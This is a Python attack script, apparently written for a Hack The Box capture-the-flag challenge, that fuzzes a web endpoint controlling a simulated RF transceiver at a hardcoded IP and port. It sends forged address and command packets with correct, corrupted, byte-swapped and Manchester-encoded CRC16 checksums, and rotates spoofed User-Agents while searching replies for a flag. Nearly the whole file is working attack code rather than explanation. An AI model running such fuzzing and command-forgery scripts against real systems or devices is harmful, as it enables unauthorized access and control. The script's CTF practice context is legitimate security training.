#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 30: Fuzzing del campo msg con diferentes longitudes
print("[*] INNOVACIÓN 30: Fuzzing longitudes de mensaje")
s = requests.Session()
s.get(base_url)

for length in [2, 4, 6, 8, 10, 12, 16, 20, 32, 64, 128]:
    msg = 'A' * length
    r = s.post(f'{base_url}/transmit', data={
        'freq': '433.92',
        'mod': 'ASK',
        'bits': '1',
        'msg': msg
    })
    if 'HTB{' in r.text or 'error' not in r.text.lower():
        print(f"  [+] Length {length}: {r.text[:100]}")

# INNOVACIÓN 31: Enviar paquetes con checksum incorrecto intencionalmente
print("\n[*] INNOVACIÓN 31: CRC incorrecto")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    # Invertir CRC
    bad_crc = crc ^ 0xFFFF
    packet = (data + struct.pack('<H', bad_crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

time.sleep(2)
r = s.get(base_url)
if 'HTB{' in r.text:
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 32: Usar diferentes endianness para TODO
print("\n[*] INNOVACIÓN 32: Big-endian para direcciones y comandos")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    # Invertir bytes de dirección y comando
    addr_be = int.from_bytes(bytes([addr]), 'little')  # Ya está en un byte, probar swap de bits
    data = struct.pack('>BB', addr, cmd)  # Big-endian
    crc = crc16(data)
    packet = (data + struct.pack('>H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

time.sleep(2)
r = s.get(base_url)
if 'HTB{' in r.text:
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 33: Manchester encoding
print("\n[*] INNOVACIÓN 33: Manchester encoding")
s = requests.Session()
s.get(base_url)

def manchester_encode(data_hex):
    """Codificar en Manchester: 0->01, 1->10"""
    result = ''
    for char in data_hex:
        val = int(char, 16)
        for bit in range(3, -1, -1):
            if (val >> bit) & 1:
                result += '10'
            else:
                result += '01'
    return result

for addr, cmd in [(0xE1, 0xFF)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet_hex = (data + struct.pack('<H', crc)).hex().upper()
    packet_manchester = manchester_encode(packet_hex)
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet_manchester})

time.sleep(2)
r = s.get(base_url)
if 'HTB{' in r.text:
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag")

# INNOVACIÓN 34: Enviar con diferentes user agents
print("\n[*] INNOVACIÓN 34: Diferentes User-Agents")
user_agents = [
    'Mozilla/5.0 (RF Device)',
    'Omega/1.0',
    'RF-Transceiver/1.0',
    'Prison-Control/1.0'
]

for ua in user_agents:
    s = requests.Session()
    s.headers['User-Agent'] = ua
    r = s.get(base_url)
    
    for addr, cmd in [(0xE1, 0xFF), (0xA1, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    
    time.sleep(1)
    r = s.get(base_url)
    if 'HTB{' in r.text:
        print(f"[SUCCESS with UA: {ua}]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

print("\n[*] Innovaciones 30-34 completadas")
